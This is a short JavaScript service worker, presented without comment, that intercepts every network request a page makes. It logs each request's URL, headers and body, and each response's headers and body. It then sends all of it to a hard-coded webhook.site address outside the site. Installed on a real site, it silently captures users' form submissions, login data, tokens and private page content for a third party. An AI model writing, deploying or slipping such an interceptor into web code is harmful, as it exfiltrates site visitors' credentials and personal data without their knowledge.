self.addEventListener('fetch', function(event) {
  const requestClone = event.request.clone();
  const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2);

  event.respondWith(
    fetch(event.request).then(response => {
      const responseClone = response.clone();
      logRequest(uniqueId, event, requestClone);
      logResponse(uniqueId, responseClone);

      return response;
    }).catch(error => {
      console.error('Fetch error:', error);
    })
  );
});

function logRequest(uniqueId, event, request) {
  request.text().then(body => {
    const requestData = {
      id: uniqueId,
      clientId: event.clientId,
      replacesClientId: event.replacesClientId,
      resultingClientId: event.resultingClientId,
      url: request.url,
      method: request.method,
      headers: [...request.headers.entries()],
      body: body,
      referrer: request.referrer
    };
    sendToWebhook(requestData);
  }).catch(error => {
    console.error('Error in reading request:', error);
  });
}

function logResponse(uniqueId, response) {
  response.text().then(body => {
    const responseData = {
      id: uniqueId,
      url: response.url,
      status: response.status,
      statusText: response.statusText,
      headers: [...response.headers.entries()],
      body: body
    };
    sendToWebhook(responseData);
  }).catch(error => {
    console.error('Error in reading response:', error);
  });
}

function sendToWebhook(data) {
  fetch('https://webhook.site/7465ccea-9437-4649-960f-74c3dcf7249a', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
    mode: 'no-cors'
  }).catch(error => {
    console.error('Error sending data to webhook:', error);
  });
}
